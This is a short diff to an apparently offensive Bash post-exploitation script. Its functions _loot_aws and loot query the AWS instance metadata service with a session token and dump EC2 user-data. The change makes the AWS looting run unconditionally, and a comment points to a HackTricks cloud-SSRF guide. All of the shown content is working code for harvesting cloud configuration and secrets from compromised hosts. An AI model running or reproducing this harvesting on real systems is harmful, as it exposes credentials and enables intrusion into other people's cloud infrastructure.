@@ -545,7 +545,7 @@ _loot_aws() {
 
     str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data)"
     [[ "$str" != *Lightsail* ]] && {
-        echo -e "${CB}AWS user_data${CDY}${CF}"
+        echo -e "${CB}AWS user_data (config)${CDY}${CF}"
         echo "$str"
         echo -en "${CN}"
     }
@@ -656,7 +656,7 @@ loot() {
 
     # SSRF
     _loot_ovh
-    [ -z "$_HS_NOT_OVH" ] && _loot_aws
+    _loot_aws
     [ -z "$_HS_NO_SSRF" ] && {
         # Found an SSRF
         echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
